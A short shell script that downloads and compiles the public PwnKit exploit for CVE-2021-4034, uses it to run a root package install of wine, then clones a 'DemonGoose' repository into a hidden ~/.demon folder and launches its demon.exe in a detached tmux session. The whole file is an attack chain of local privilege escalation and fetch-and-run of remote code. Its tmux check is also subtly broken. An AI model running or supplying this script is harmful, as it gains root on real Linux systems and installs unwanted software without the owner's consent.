#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done
make

installer="..."
flags="..."
found=0
tmux=1
if [ command -v tmux &> /dev/null ]; then tmux=0; fi;
if [ $found -eq 0 ] && command -v dnf &> /dev/null
then
    installer="dnf"
    flags="-qy"
    found=1
fi
if [ $found -eq 0 ] && command -v yum &> /dev/null
then
    installer="yum"
    flags="-qy"
    found=1
fi
if [ $found -eq 0 ] && command -v apt-get &> /dev/null
then
    installer="apt-get"
    flags="--assume-yes"
    found=1
fi

if [ $tmux -eq 1 ]; then echo "$installer $flags install tmux"; fi;
echo "$installer $flags install wine" | ./cve-2021-4034
oldPWD=$PWD
mkdir -p "$HOME/.demon"
cd "$HOME/.demon"
git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
tmux new -d wine DemonGoose/DemonThings/demon.exe
cd $oldPWD
